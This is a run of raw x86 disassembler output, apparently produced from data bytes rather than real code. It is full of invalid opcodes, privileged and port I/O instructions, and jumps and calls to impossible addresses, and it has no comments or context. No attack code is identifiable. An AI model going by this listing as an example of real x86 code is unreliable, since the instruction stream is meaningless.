  43d5b9:	adc    ch,cl
  43d5bb:	sub    BYTE PTR [ecx-0x76e37f41],al
  43d5c1:	je     0x43d5c3
	...
  43d5df:	add    ch,dh
  43d5e1:	(bad)  
  43d5e2:	jb     0x43d5e3
  43d5e4:	cli    
  43d5e5:	daa    
  43d5e6:	rcl    BYTE PTR es:[esi],cl
  43d5e9:	repnz cmp al,0x86
  43d5ec:	and    BYTE PTR [edi-0x69f2bfec],dl
  43d5f2:	shl    DWORD PTR [esi+0x3e7fff9],cl
  43d5f8:	or     eax,0x993cd5cd
  43d5fd:	jnp    0x43d597
  43d5ff:	cmp    eax,0xd3b131c7
  43d604:	mov    bh,0x4a
  43d606:	gs dec eax
  43d608:	push   es
  43d609:	and    DWORD PTR [ebx-0x4c],0xffffffa4
  43d60d:	xor    ecx,esi
  43d60f:	rcl    DWORD PTR [ebp-0x68c2876d],cl
  43d615:	xor    ecx,esp
  43d617:	push   ss
  43d618:	popa   
  43d619:	movaps XMMWORD PTR [eax+edx*4],xmm0
  43d61d:	inc    eax
  43d61e:	pop    ebx
  43d61f:	or     edx,edx
  43d621:	and    BYTE PTR [ebx-0x4d],0x74
  43d625:	xor    ecx,eax
  43d627:	sub    BYTE PTR [ebx],cl
  43d629:	test   al,0xe8
  43d62b:	add    cl,BYTE PTR ds:0x8e866400
  43d631:	xor    ch,BYTE PTR [ecx-0x5e3040c4]
  43d637:	push   ebp
  43d638:	sar    DWORD PTR [ebx],cl
  43d63a:	in     al,dx
  43d63b:	mov    es,ecx
  43d63d:	adc    DWORD PTR [eax+0x73],0x42
  43d641:	xor    eax,ebp
  43d643:	sub    eax,DWORD PTR [eax]
	...
  43d661:	add    bl,al
  43d663:	adc    al,0x82
  43d665:	cmp    al,0x81
  43d667:	stos   DWORD PTR es:[edi],eax
  43d668:	sub    BYTE PTR [ebp+ebx*2+0x0],bh
  43d66c:	jmp    0xcde60b74
  43d671:	cmp    al,0x17
  43d673:	test   DWORD PTR [edx],ebp
  43d675:	rol    DWORD PTR [ecx-0x382c9345],cl
  43d67b:	std    
  43d67c:	call   0x21c86384
  43d681:	sub    ebx,DWORD PTR [esi+0x39]
  43d684:	inc    edx
  43d685:	cmp    al,0x85
  43d687:	mov    edx,0xf8618e9c
  43d68c:	push   DWORD PTR [eax+0x5c]
  43d68f:	xor    edx,edi
  43d691:	jmp    0x265a90bc
  43d696:	adc    DWORD PTR [esp+eax*2+0x9ade99],eax
  43d69d:	(bad)  
  43d69f:	into   
  43d6a0:	mov    WORD PTR [edx+ecx*4+0x7b7052c0],fs
  43d6a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d6a8:	mov    BYTE PTR [esi+ebx*2-0x79],bh
  43d6ac:	je     0x43d62f
  43d6ae:	loope  0x43d6bb
  43d6b0:	cmp    al,0xd9
  43d6b2:	into   
  43d6b3:	xor    BYTE PTR [ebx-0x72fea357],al
  43d6b9:	and    al,0xb9
  43d6bb:	rcl    BYTE PTR [ecx+0x64],0x4c
  43d6bf:	call   0xa0f83313
  43d6c4:	out    0xd5,eax
	...
  43d6e2:	add    BYTE PTR [eax],al
  43d6e4:	into   
  43d6e5:	ss cli 
  43d6e7:	rcl    BYTE PTR [edx],cl
  43d6e9:	mov    cl,0xc7
  43d6eb:	mov    dh,0x8a
  43d6ed:	sub    dl,bh
  43d6ef:	xor    eax,0x1fc1e8fa
  43d6f4:	dec    bh
  43d6f6:	cli    
  43d6f7:	adc    al,0x79
  43d6f9:	cmp    DWORD PTR [ebp+eax*1+0x73],0x32
  43d6fe:	push   edx
  43d6ff:	sub    esi,0xf686fa3f
  43d705:	stos   DWORD PTR es:[edi],eax
  43d706:	addr16 xchg ecx,eax
  43d708:	scas   eax,DWORD PTR es:[edi]
  43d709:	mov    edx,?
  43d70b:	jbe    0x43d69f
  43d70d:	mov    ebx,0xd04c606b
  43d712:	mov    esp,ds
  43d714:	dec    esi
  43d715:	push   0xee9ae
  43d71a:	call   0xfa6efa67
  43d71f:	mov    edx,0x6f8485
  43d724:	dec    edx
  43d725:	jmp    0x43d71c
  43d727:	push   eax
  43d728:	mov    esi,0xa47d8d05
  43d72d:	dec    ebx
  43d72e:	loop   0x43d6e9
  43d730:	and    eax,0xdc6af5eb
  43d735:	js     0x43d77a
  43d737:	pop    esp
  43d738:	test   BYTE PTR [ebp-0x4],bl
  43d73b:	mov    WORD PTR [ecx+0x4ce85267],ds
  43d741:	(bad)
  43d744:	or     esi,DWORD PTR [ecx+0x66]
  43d747:	lea    eax,[eax]
	...
  43d765:	add    BYTE PTR [ecx-0x25],dh
  43d768:	cmc    
  43d769:	jne    0x43d78f
  43d76b:	push   ebx
  43d76c:	add    esi,0x5076712f
  43d772:	sub    BYTE PTR ds:[ecx-0x75],dl
  43d776:	push   0xffffffdb
  43d778:	mov    es,WORD PTR [ebx-0x3b8615a5]
  43d77e:	je     0x43d7ca
  43d780:	xchg   DWORD PTR [ebp-0x40],eax
  43d783:	dec    esi
  43d784:	jns    0x43d77e
  43d786:	jne    0x43d7f0
  43d788:	add    al,0xb8
  43d78a:	loopne 0x43d78e
  43d78c:	add    BYTE PTR [eax],al
  43d78e:	dec    esp
  43d78f:	xchg   DWORD PTR [edi+edi*8],edx
  43d792:	stos   DWORD PTR es:[edi],eax
  43d793:	dec    ecx
  43d794:	jns    0x43d75b
  43d796:	and    BYTE PTR [ebp+0x513404bc],bh
  43d79c:	mov    eax,0x331b0
  43d7a1:	push   esi
  43d7a2:	sbb    al,0xfc
  43d7a4:	pop    ebp
  43d7a5:	inc    eax
  43d7a6:	xor    al,0x52
  43d7a8:	cmc    
  43d7a9:	adc    eax,0x4011e8
  43d7ae:	scas   eax,DWORD PTR es:[edi]
  43d7af:	div    edi
  43d7b1:	in     al,0x67
  43d7b3:	add    edi,ebx
  43d7b5:	or     al,0x20
  43d7b7:	retf   0x39
  43d7ba:	or     eax,0x860b3a9a
  43d7bf:	in     eax,0xe9
  43d7c1:	retf   0x4c87
  43d7c4:	add    esi,DWORD PTR [eax]
  43d7c6:	std    
  43d7c7:	pop    eax
  43d7c8:	enter  0x74,0x0
	...
  43d7e8:	ficom  DWORD PTR [esi-0x1379abbf]
  43d7ee:	sub    ebx,0xfffffffd
  43d7f1:	sbb    esi,edi
  43d7f3:	call   FWORD PTR [esi-0x6f]
  43d7f6:	outs   dx,BYTE PTR ds:[esi]
  43d7f7:	add    al,0xd
  43d7f9:	sbb    DWORD PTR [esi-0x1a6ccf9],esp
  43d7ff:	mov    WORD PTR [eax-0x5505c8d4],cs
  43d805:	adc    BYTE PTR [esi+0x1d],cl
  43d808:	mov    ds:0x3d098c35,eax
  43d80d:	mov    ds:0x86a507bf,al
  43d812:	gs cld 
  43d814:	mov    ah,BYTE PTR [ebp-0x3]
  43d817:	dec    DWORD PTR [edi]
  43d819:	sbb    esi,edi
  43d81b:	test   BYTE PTR [ebp-0x2c],cl
  43d81e:	fisttp WORD PTR [eax+eax*4+0x6afa356c]
  43d825:	pop    es
  43d826:	into   
  43d827:	dec    edi
  43d828:	nop
  43d829:	shr    DWORD PTR [edi],cl
  43d82b:	sti    
  43d82c:	pop    edx
  43d82d:	pop    ebp
  43d82e:	sub    ebx,DWORD PTR [ecx-0x60]
  43d831:	arpl   WORD PTR [eax],di
  43d833:	or     DWORD PTR [ebp+0x14],0x8
  43d837:	sti    
  43d838:	sti    
  43d839:	mov    eax,ds:0x1b254f44
  43d83e:	mov    bh,dl
  43d840:	xor    dl,BYTE PTR [ecx-0x1eb2d0ff]
  43d846:	inc    esi
  43d847:	mov    ebp,0x86c91909
	...
  43d868:	add    BYTE PTR [eax],al
  43d86a:	sub    DWORD PTR [edi+0xc3727],edx
  43d870:	jmp    0xb21a3278
  43d875:	jl     0x43d895
  43d877:	(bad)  
  43d878:	call   0x50bd2280
  43d87d:	lods   al,BYTE PTR ds:[esi]
  43d87e:	jb     0x43d83e
  43d880:	test   al,0x3
  43d882:	cwde   
  43d883:	sub    DWORD PTR [edx+edi*1],0xffffffe7
  43d887:	sub    eax,0x28514098
  43d88c:	jg     0x43d8e9
  43d88e:	sbb    ebp,esp
  43d890:	adc    BYTE PTR [edx-0x65],dh
  43d893:	sub    eax,0xf1bcf519
  43d898:	sub    BYTE PTR [esi-0xbeefcba],cl
  43d89e:	xchg   bl,dh
  43d8a0:	xor    al,0x3a
  43d8a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d8a3:	sub    eax,0x49a84a8
  43d8a8:	jl     0x43d8af
  43d8aa:	jmp    0xd0b2:0xa3fca23f
  43d8b1:	hlt    
  43d8b2:	retf   0x6bc0
  43d8b5:	scas   al,BYTE PTR es:[edi]
  43d8b6:	push   0x18
  43d8b8:	clc    
  43d8b9:	js     0x43d932
  43d8bb:	sub    eax,0x7e9e65
  43d8c0:	je     0x43d940
  43d8c2:	push   esi
  43d8c3:	cs mov ecx,0xaa78d238
  43d8c9:	sub    eax,DWORD PTR [edx+0x72]
  43d8cc:	stos   DWORD PTR es:[edi],eax
  43d8cd:	cmp    BYTE PTR [eax],al
	...
  43d8eb:	add    BYTE PTR [esi-0x6c3fe3c0],cl
  43d8f1:	inc    esi
  43d8f2:	nop
  43d8f3:	sbb    esi,DWORD PTR [edx+0x2b]
  43d8f6:	xchg   ecx,eax
  43d8f7:	mov    WORD PTR [edx],gs
  43d8f9:	ja     0x43d90e
  43d8fb:	cmp    al,0x89
  43d8fd:	ss add dh,al
  43d900:	jecxz  0x43d92f
  43d902:	bnd repz jmp 0x43d933
  43d906:	call   FWORD PTR ds:0x5c07b3d4
  43d90c:	push   ebx
  43d90d:	and    eax,0x2a85bce7
  43d912:	cli    
  43d913:	gs dec esi
  43d915:	mov    cl,0x19
  43d917:	jmp    0x7bdd:0x278704c3
  43d91e:	jl     0x43d971
  43d920:	fisubr DWORD PTR ss:[esi-0x407edac4]
  43d927:	mov    ebp,0x41f28512
  43d92c:	mov    ds,WORD PTR [edx-0x4]
  43d92f:	es cdq 
  43d931:	mov    bl,0xf7
  43d933:	adc    dl,BYTE PTR [eax]
  43d935:	jnp    0x43d9ab
  43d937:	add    esi,esp
  43d939:	popf   
  43d93a:	lods   eax,DWORD PTR ds:[esi]
  43d93b:	or     al,0xf5
  43d93d:	(bad)  
  43d93f:	call   0x29da:0xffcb8393
  43d946:	gs jmp 0x9958030a
  43d94c:	cld    
  43d94d:	mov    edi,0x69ff
	...
  43d96e:	int    0xf8
  43d970:	pop    edx
  43d971:	jb     0x43d9b6
  43d973:	(bad)  
  43d974:	push   esi
  43d975:	mov    al,ds:0x340000cf
  43d97a:	xchg   BYTE PTR [eax],bl
  43d97c:	adc    ch,0xe9
  43d97f:	add    eax,DWORD PTR [eax]
  43d981:	jmp    0x4396a7c5
  43d986:	ins    DWORD PTR es:[edi],dx
  43d987:	and    al,0x9f
  43d989:	pop    ebx
  43d98a:	sbb    ch,BYTE PTR [edx]
  43d98c:	cs ret 0x6d46
  43d990:	jae    0x43d982
  43d992:	xchg   edi,eax
  43d993:	sbb    al,0xe7
  43d995:	addr16 push edi
  43d997:	es cli 
  43d999:	or     BYTE PTR [edi],0xdd
  43d99c:	mov    edi,0xdb9fd700
  43d9a1:	inc    ebx
  43d9a2:	xor    al,0x29
  43d9a4:	mov    ecx,0xfaf5a80f
  43d9a9:	jmp    DWORD PTR [ebx+eiz*4]
  43d9ac:	sbb    bl,dh
  43d9ae:	mov    bh,0xff
  43d9b0:	test   al,0xe0
  43d9b2:	repz (bad) 
  43d9b4:	dec    DWORD PTR [esi]
  43d9b6:	push   0xe4fffae2
  43d9bb:	pushf  
  43d9bc:	cli    
  43d9bd:	pop    es
  43d9be:	hlt    
  43d9bf:	push   DWORD PTR [ebx+0x2b]
  43d9c2:	mov    esp,0xe4ffffa3
  43d9c7:	xlat   BYTE PTR ds:[ebx]
  43d9c8:	pop    edi
  43d9c9:	xchg   edx,eax
  43d9ca:	and    esi,ebx
  43d9cc:	xor    ebx,eax
  43d9ce:	test   al,0x14
  43d9d0:	div    DWORD PTR ds:0x0
	...
  43d9ee:	add    BYTE PTR [eax],al
  43d9f0:	and    al,ah
  43d9f2:	cmp    DWORD PTR [eax],eax
  43d9f4:	das    
  43d9f5:	hlt    
  43d9f6:	loop   0x43d9e5
  43d9f8:	mov    bl,0xf5
  43d9fa:	cmc    
  43d9fb:	mov    esp,DWORD PTR [esi+edx*8-0x5b65cd04]
  43da02:	sahf   
  43da03:	frstor [edi-0x1]
  43da06:	out    0xfa,eax
  43da08:	add    cl,ch
  43da0a:	cmc    
  43da0b:	idiv   BYTE PTR [ecx+0x1f]
  43da0e:	fadd   DWORD PTR [ebx+0x74]
  43da11:	pop    ds
  43da12:	outs   dx,BYTE PTR ds:[esi]
  43da13:	or     esi,ecx
  43da15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43da16:	inc    esi
  43da17:	cli    
  43da18:	inc    ebx
  43da19:	repnz loop 0x43da32
  43da1c:	push   edx
  43da1d:	repnz cmc 
  43da1f:	imul   DWORD PTR [ecx+0x1f]
  43da22:	fadd   DWORD PTR [ebx+0x64]
  43da25:	inc    DWORD PTR [eax]
  43da27:	add    BYTE PTR [ebx+ebx*2+0x9],ah
  43da2b:	mov    esi,DWORD PTR [ecx]
  43da2d:	retf   
  43da2e:	fild   DWORD PTR [ebx+0x34]
  43da31:	dec    esi
  43da32:	dec    ecx
  43da33:	push   0x3e10500d
  43da38:	or     eax,0xc7c62be6
  43da3d:	xor    BYTE PTR [ecx],0xf1
  43da40:	or     BYTE PTR [ecx],bh
  43da42:	push   esp
  43da43:	ds or  eax,0xa74bafd9
  43da49:	dec    esp
  43da4a:	es cld 
  43da4c:	pushf  
  43da4d:	mov    eax,ds:0x45adba31
  43da52:	mov    esi,0xff
	...
  43da6f:	add    BYTE PTR [eax],al
  43da71:	add    BYTE PTR [edi],dh
  43da73:	(bad)  
  43da74:	stos   BYTE PTR es:[edi],al
  43da75:	or     eax,DWORD PTR [eax+edx*1-0x4feea874]
  43da7c:	(bad)  
  43da7d:	pop    es
  43da7e:	xchg   esi,eax
  43da7f:	call   0xeb63d7a9
  43da84:	arpl   WORD PTR [ebx-0x1801aa50],sp
  43da8a:	mov    ds:0x37fa37c4,eax
  43da8f:	sbb    eax,0x119cd426
  43da94:	xor    dh,BYTE PTR [esi]
  43da96:	into   
  43da97:	xchg   esp,eax
  43da98:	pop    es
  43da99:	mov    ebp,esp
  43da9b:	fidivr DWORD PTR [esi-0x294ff3fd]
  43daa1:	pop    es
  43daa2:	xchg   BYTE PTR [eax],ch
  43daa4:	sub    ch,bh
  43daa6:	fbstp  TBYTE PTR [edx]
  43daa8:	pop    esi
  43daa9:	mov    ds:0xe803d568,eax
  43daae:	jmp    FWORD PTR [edx+esi*1-0x6]
  43dab2:	sbb    DWORD PTR [ebx],0xffffffde
  43dab5:	fxch   st(6)
  43dab7:	sbb    BYTE PTR [esi+0x73],bh
  43daba:	adc    BYTE PTR [ecx-0x55],dl
  43dabd:	xor    BYTE PTR [ebx+0x69],ah
  43dac0:	sti    
  43dac1:	pop    esp
  43dac2:	add    eax,0x1886deed
  43dac7:	test   DWORD PTR [edx+0x3e],edx
  43daca:	or     eax,0xda0e9100
  43dacf:	sub    DWORD PTR [ecx+0x254c6e63],ebx
  43dad5:	add    al,0x0
	...
  43daf3:	add    BYTE PTR [edx-0x61bf32d1],cl
  43daf9:	not    BYTE PTR [eax+0x7929c598]
  43daff:	into   
  43db00:	xor    ah,BYTE PTR [ebx+0x57]
  43db03:	xor    eax,0xd90aca17
  43db08:	aad    0x3e
  43db0a:	in     al,dx
  43db0b:	add    ebx,DWORD PTR [eax+0x75]
  43db0e:	dec    esp
  43db0f:	and    esi,0xfffffffc
  43db12:	out    0x3,al
  43db14:	or     eax,0x3d0ba37b
  43db19:	sub    DWORD PTR [ebx+0x39c3cf0b],edi
  43db1f:	add    al,0xd6
  43db21:	adc    ebp,DWORD PTR [ecx+0x14]
  43db24:	dec    ebp
  43db25:	add    BYTE PTR [esp+eax*2+0x3e],ah
  43db29:	xchg   edi,eax
  43db2a:	mov    ch,0xcc
  43db2c:	(bad)  
  43db2d:	mov    bl,0xf0
  43db2f:	js     0x43db3f
  43db31:	(bad)  
  43db32:	call   0x5a1c003a
  43db37:	les    ebp,FWORD PTR [edx-0x5ecfbc84]
  43db3d:	sub    ecx,edi
  43db3f:	sub    ebp,DWORD PTR [esi-0x80]
  43db42:	icebp  
  43db43:	xor    al,0x35
  43db45:	(bad)  
  43db46:	arpl   WORD PTR [esp+eax*1-0x16],ax
  43db4a:	push   eax
  43db4b:	fs xchg edi,eax
  43db4d:	shr    al,0x88
  43db50:	dec    edi
  43db51:	rcl    BYTE PTR [eax+0x69000d01],1
  43db57:	sub    eax,DWORD PTR [eax]
	...
  43db75:	add    BYTE PTR [ebx+0x3e],al
  43db78:	ret    0x8934
  43db7b:	inc    eax
  43db7c:	xor    al,0xec
  43db7e:	(bad)  [edi]
  43db80:	push   DWORD PTR [ebp-0x5978f55e]
  43db86:	pop    esi
  43db87:	es adc al,0x9
  43db8a:	sbb    al,0xc0
  43db8c:	(bad)  
  43db8d:	cmp    DWORD PTR [eax],eax
  43db8f:	mov    ah,0xb
  43db91:	(bad)  
  43db93:	mov    eax,0x102ef4fa
  43db98:	inc    eax
  43db99:	jmp    0x7e8a57f4
  43db9e:	adc    eax,0xd8a91541
  43dba3:	push   0x26402487
  43dba8:	je     0x43db9b
  43dbaa:	cmp    DWORD PTR [eax+ecx*4],edx
  43dbad:	sti    
  43dbae:	into   
  43dbaf:	sub    BYTE PTR [ecx-0x4e],bl
  43dbb2:	test   bl,al
  43dbb4:	cli    
  43dbb5:	and    BYTE PTR [ecx+eax*1+0x0],cl
  43dbb9:	pushf  
  43dbba:	xchg   ebp,eax
  43dbbb:	adc    al,0x7e
  43dbbd:	inc    ebp
  43dbbe:	push   ss
  43dbbf:	mov    ds:0x61268ffe,eax
  43dbc4:	repnz add DWORD PTR cs:[ebp-0x41],edi
  43dbc9:	popf   
  43dbca:	push   ds
  43dbcb:	mov    ds:0x26ad10ff,al
  43dbd0:	cli    
  43dbd1:	push   ss
  43dbd2:	out    0x81,al
  43dbd4:	cwde   
  43dbd5:	push   cs
  43dbd6:	loope  0x43dc30
  43dbd8:	add    BYTE PTR [edx],dl
	...
  43dbf6:	add    BYTE PTR [eax],al
  43dbf8:	or     al,0xda
  43dbfa:	mov    edi,0xbecbfb72
  43dbff:	add    DWORD PTR ds:0xbeefa26,edi
  43dc05:	imul   esi,DWORD PTR [ebx+0xf],0xf4f928a3
  43dc0c:	(bad)  
  43dc0d:	cli    
  43dc0e:	aas    
  43dc0f:	jmp    0xe99997f5
  43dc14:	push   cs
  43dc15:	sahf   
  43dc16:	cmp    BYTE PTR [eax],al
  43dc18:	pop    esp
  43dc19:	addr16 push cs
  43dc1b:	mov    ebx,DWORD PTR [eax+esi*1]
  43dc1e:	jg     0x43dc5c
  43dc20:	gs dec esp
  43dc22:	inc    ebx
  43dc23:	add    BYTE PTR [edi+eiz*2],dh
  43dc26:	add    cl,BYTE PTR [ebx+0x32802f8]
  43dc2c:	jl     0x43dc1a
  43dc2e:	fbstp  TBYTE PTR [ebx]
  43dc30:	fs shl dl,0xa1
  43dc34:	fwait
  43dc35:	in     al,dx
  43dc36:	cmc    
  43dc37:	xor    esi,DWORD PTR [ecx+eax*8-0x2]
  43dc3b:	inc    DWORD PTR [ecx]
  43dc3d:	test   eax,0x8b8883e6
  43dc42:	dec    ecx
  43dc43:	push   esi
  43dc44:	(bad)  
  43dc45:	mov    dh,0x5
  43dc47:	mov    dh,0x67
  43dc49:	xchg   ah,bh
  43dc4b:	mov    WORD PTR [ecx+0x108d4a7b],?
  43dc51:	test   eax,0x3b48fbe
  43dc56:	div    DWORD PTR [esi]
  43dc58:	cmp    al,0x31
  43dc5a:	idiv   edi
	...
  43dc78:	add    BYTE PTR [eax],al
  43dc7a:	sbb    eax,DWORD PTR [ecx+0xb749843]
  43dc80:	shr    BYTE PTR [ecx+edi*8-0x5e3f810e],1
  43dc87:	sbb    BYTE PTR [ecx+eax*1+0x29],ah
  43dc8b:	cmp    DWORD PTR [edx-0x1dd5e4b0],edx
  43dc91:	and    edi,ebp
  43dc93:	repnz cmc 
  43dc95:	lea    esi,[ecx+0x7b]
  43dc98:	dec    edx
  43dc99:	call   0x3f7c81
  43dc9e:	and    BYTE PTR [ebx+esi*2+0x7abe7a0b],bh
  43dca5:	sti    
  43dca6:	jno    0x43dd15
  43dca8:	mov    cl,0x5e
  43dcaa:	iret   
  43dcab:	in     al,0xb9
  43dcad:	mov    al,0xd
  43dcaf:	sbb    BYTE PTR [ecx],bl
  43dcb1:	test   eax,0x697e1aa1
  43dcb7:	inc    ecx
  43dcb8:	sub    ebx,0x31
  43dcbb:	xor    bh,dh
  43dcbd:	(bad)  
  43dcbe:	mov    esi,0xfad706
  43dcc3:	aad    0x4d
  43dcc5:	ds or  eax,0x1923b2ac
  43dccb:	pop    edi
  43dccc:	ret    0x1e23
  43dccf:	sbb    DWORD PTR [esi],edx
  43dcd1:	adc    al,0x3b
  43dcd3:	jbe    0x43dd02
  43dcd5:	or     DWORD PTR [ebp+0x25],0xffffffe0
  43dcd9:	xchg   cl,dl
  43dcdb:	cmp    al,0xa
  43dcdd:	sti    
	...
  43dcfa:	add    BYTE PTR [eax],al
  43dcfc:	cdq    
  43dcfd:	xor    al,0x6
  43dcff:	lea    eax,[ecx+0x4989123d]
  43dd05:	cmc    
  43dd06:	pop    ss
  43dd07:	call   0xfa71a22a
  43dd0c:	xchg   al,dl
  43dd0e:	jnp    0x43dd8b
  43dd10:	xor    DWORD PTR ds:0x1558fa87,ebp
  43dd16:	jecxz  0x43dd5b
  43dd18:	xor    DWORD PTR [ecx+0x7f],ecx
  43dd1b:	inc    ebx
  43dd1c:	sub    DWORD PTR [ecx+0x16],edx
  43dd1f:	cmp    BYTE PTR [ebx+0x9e62dd5],0xb2
  43dd26:	stos   BYTE PTR es:[edi],al
  43dd27:	and    esp,DWORD PTR [ecx]
  43dd29:	cwde   
  43dd2a:	stos   BYTE PTR es:[edi],al
  43dd2b:	and    ebx,DWORD PTR ds:0xd0003ff
  43dd31:	inc    esi
  43dd32:	xchg   DWORD PTR [edx],esp
  43dd34:	or     al,0x19
  43dd36:	(bad)  
  43dd37:	push   edx
  43dd38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43dd39:	leave  
  43dd3a:	dec    esi
  43dd3b:	cld    
  43dd3c:	xchg   edx,eax
  43dd3d:	xchg   esp,eax
  43dd3e:	or     dl,BYTE PTR ds:[ecx+0xd0004c3]
  43dd45:	add    BYTE PTR [edi+0x3],cl
  43dd48:	mov    BYTE PTR [ebx-0x683d57fc],bh
  43dd4e:	sbb    BYTE PTR [ebx],dl
  43dd50:	jge    0x43dd39
  43dd52:	rol    BYTE PTR [ebx+0x7fc1265a],0xce
  43dd59:	fisttp DWORD PTR [eax-0x2c]
  43dd5c:	call   0x1101e61
	...
  43dd7d:	add    BYTE PTR [edx+eax*8-0x18],ah
  43dd81:	xor    BYTE PTR [ecx],bl
  43dd83:	loopne 0x43dd7a
  43dd85:	ret    
  43dd86:	cmp    bh,BYTE PTR [ecx-0x68]
  43dd89:	xchg   DWORD PTR [esi+esi*8],edi
  43dd8c:	ins    BYTE PTR es:[edi],dx
  43dd8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43dd8e:	sub    BYTE PTR [esi],ah
  43dd90:	call   0xd637d6c5
  43dd95:	ret    
  43dd96:	sbb    bh,BYTE PTR [ecx-0x25]
  43dd99:	pop    es
  43dd9a:	add    al,al
  43dd9c:	call   0xe9449d8f
  43dda1:	add    edi,DWORD PTR [eax-0x5]
  43dda4:	mov    edx,0x52f1cb30
  43dda9:	xchg   esp,edi
  43ddab:	cmc    
  43ddac:	ins    BYTE PTR es:[edi],dx
  43ddad:	(bad)  
  43ddae:	call   0xb15fc5d8
  43ddb3:	inc    edx
  43ddb4:	inc    ebx
  43ddb5:	xor    DWORD PTR [edx+0x5208b4e0],esi
  43ddbb:	repz or BYTE PTR [edx+0xb],dl
  43ddbf:	add    cl,bl
  43ddc1:	jle    0x43dd51
  43ddc3:	fdiv   QWORD PTR [esp+eax*1]
  43ddc6:	or     eax,0xcc1bb900
  43ddcb:	inc    edx
  43ddcc:	adc    esi,DWORD PTR [ecx]
  43ddce:	mov    es,WORD PTR [eax-0x6d]
  43ddd1:	mov    ebx,0x3cc6491
  43ddd6:	call   0xff28:0xe71be825
  43dddd:	cmc    
  43ddde:	cmp    eax,0x2d7e9f
	...
  43ddff:	add    BYTE PTR [ebp-0x41],dh
  43de02:	add    ch,cl
  43de04:	push   cs
  43de05:	add    BYTE PTR [edi+eax*1-0x6d],dh
  43de09:	or     al,0x8d
  43de0b:	jge    0x43de7f
  43de0d:	mov    ebx,0x730ee902
  43de12:	dec    ebx
  43de13:	or     eax,0x16b41d69
  43de18:	sbb    al,0x2a
  43de1a:	mov    WORD PTR ds:0xae4ff135,gs
  43de20:	sbb    esp,DWORD PTR [eax]
  43de22:	or     eax,0x4b731129
  43de27:	lds    edi,FWORD PTR [edx]
  43de29:	es mov edx,0x66010838
  43de2f:	jmp    0xeba9434d
  43de34:	not    BYTE PTR [edi]
  43de36:	mov    edx,0xa51cdd7c
  43de3b:	jle    0x43de79
  43de3d:	sub    dh,cl
  43de3f:	in     al,0xee
  43de41:	inc    esi
  43de42:	ds jmp 0xd1508a66
  43de48:	push   cs
  43de49:	add    BYTE PTR [eax],al
  43de4b:	imul   ecx,DWORD PTR [eax-0x310b04f0],0x78e94010
  43de55:	dec    DWORD PTR [ebp+eiz*4-0x3eb05f16]
  43de5c:	mov    ebp,0x21033eb5
  43de61:	push   ebp
  43de62:	repnz add BYTE PTR es:[eax],al
	...
  43de82:	std    
  43de83:	jae    0x43dec8
  43de85:	lds    ebp,FWORD PTR [esi-0x4c]
  43de88:	gs jmp 0xf53d0116
  43de8e:	jmp    0xf2a3:0xa400400f
  43de95:	test   DWORD PTR [ebx-0x7ca8fb93],edx
  43de9b:	or     dh,BYTE PTR [eax+0x4f00b412]
  43dea1:	push   DWORD PTR [edi+0x68e7ff89]
  43dea7:	aam    0xf5
  43dea9:	jmp    FWORD PTR [edx]
  43deab:	mov    esi,0xfb67243e
  43deb0:	not    bl
  43deb2:	fild   QWORD PTR [edi+0x1e]
  43deb5:	adc    al,0x3d
  43deb7:	addr16 (bad) 
  43deb9:	push   DWORD PTR [ecx+eax*4]
  43debc:	jbe    0x43dee2
  43debe:	adc    BYTE PTR fs:[edi],al
  43dec1:	test   DWORD PTR ds:0x1efffffb,ebx
  43dec7:	add    ch,BYTE PTR [eax+0x7b]
  43deca:	dec    eax
  43decb:	mov    ds:0xecd4e87d,eax
  43ded0:	cmc    
  43ded1:	call   FWORD PTR [ebp-0x56efe1c9]
  43ded7:	mov    ebx,0xfd348405
  43dedc:	(bad)  
  43dedd:	jmp    DWORD PTR [ecx+0x78]
  43dee0:	push   ds
  43dee1:	add    bh,ah
  43dee3:	(bad)  
  43dee4:	dec    DWORD PTR [edi+0x0]
	...
  43df03:	add    BYTE PTR [esi],dl
  43df05:	mov    bh,0xe2
  43df07:	cmp    al,0x1f
  43df09:	icebp  
  43df0a:	cmc    
  43df0b:	test   BYTE PTR [eax+ebp*2],dh
  43df0e:	cld    
  43df0f:	std    
  43df10:	daa    
  43df11:	popf   
  43df12:	push   ds
  43df13:	fisub  WORD PTR [edi+0x31661ff]
  43df19:	sub    al,0xf5
  43df1b:	adc    eax,0x400f70
  43df20:	daa    
  43df21:	aam    0xff
  43df23:	je     0x43dec7
  43df25:	pop    es
  43df26:	loope  0x43def7
  43df28:	or     eax,0x49872b0c
  43df2d:	cmp    eax,0x180de8f9
  43df32:	(bad)  
  43df33:	dec    DWORD PTR [ebp+0x387504fe]
  43df39:	sub    dh,cl
  43df3b:	xchg   BYTE PTR [eax],ah
  43df3d:	ins    DWORD PTR es:[edi],dx
  43df3e:	dec    esp
  43df3f:	ds or  eax,0xe503b11a
  43df45:	dec    edi
  43df46:	cmp    al,0x3f
  43df48:	or     eax,0x60a86041
  43df4d:	xor    ch,BYTE PTR [ecx]
  43df4f:	je     0x43df56
  43df51:	lods   al,BYTE PTR ds:[esi]
  43df52:	xchg   edx,eax
  43df53:	and    edx,DWORD PTR [ecx+0x19]
  43df56:	(bad)  
  43df57:	call   FWORD PTR [eax+0xe03e29d]
  43df5d:	sbb    esi,edi
  43df5f:	out    0xeb,eax
  43df61:	cmp    al,0x2f
  43df63:	cli    
  43df64:	xor    edx,DWORD PTR es:[esi]
  43df67:	test   DWORD PTR [eax],eax
	...
  43df85:	add    BYTE PTR [eax],ch
  43df87:	mov    ch,BYTE PTR [ecx]
  43df89:	or     DWORD PTR [ebp+0x42],0xffffff87
  43df8d:	ror    BYTE PTR ds:0xdafafe19,0xad
  43df94:	sysenter 
  43df96:	jmp    0x43df6d
  43df98:	add    edi,ebx
  43df9a:	jp     0x43dfe1
  43df9c:	xchg   esi,eax
  43df9d:	popa   
  43df9e:	int    0x58
  43dfa0:	(bad)  
  43dfa1:	out    0x65,eax
  43dfa3:	nop
  43dfa4:	das    
  43dfa5:	cli    
  43dfa6:	cwde   
  43dfa7:	pushf  
  43dfa8:	loop   0x43dfa1
  43dfaa:	or     eax,0x56e7fe19
  43dfaf:	in     al,dx
  43dfb0:	das    
  43dfb1:	cli    
  43dfb2:	test   DWORD PTR [edx+eiz*8+0xa],ebx
  43dfb6:	or     DWORD PTR [eax],ebx
  43dfb8:	stc    
  43dfb9:	test   BYTE PTR [ecx-0x770001e8],bl
